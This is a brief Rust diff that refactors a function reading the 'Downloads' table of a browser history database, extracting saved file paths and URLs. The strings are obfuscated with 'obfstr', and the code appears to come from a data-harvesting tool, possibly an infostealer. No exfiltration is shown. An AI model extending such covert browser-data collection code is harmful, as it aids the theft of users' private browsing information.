@@ -5,7 +5,7 @@ use alloc::boxed::Box;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
 use obfstr::obfstr as s;
-use sqlite::{TableRecord, TableRecordExtension};
+use database::TableRecord;
 use tasks::{parent_name, Task};
 use utils::path::{Path};
 
@@ -41,7 +41,7 @@ fn read_downloads(profile: &Path) -> Option<Vec<Download>> {
     read_sqlite3_and_map_records(&history_path, s!("Downloads"), extract_download_from_record)
 }
 
-fn extract_download_from_record(record: &Box<dyn TableRecord>) -> Option<Download> {
+fn extract_download_from_record(record: &dyn TableRecord) -> Option<Download> {
     let saved_as = record.get_value(DOWNLOADS_CURRENT_PATH)?.as_string()?.to_owned();
     let url = record.get_value(DOWNLOADS_TAB_URL)?.as_string()?.to_owned();
 
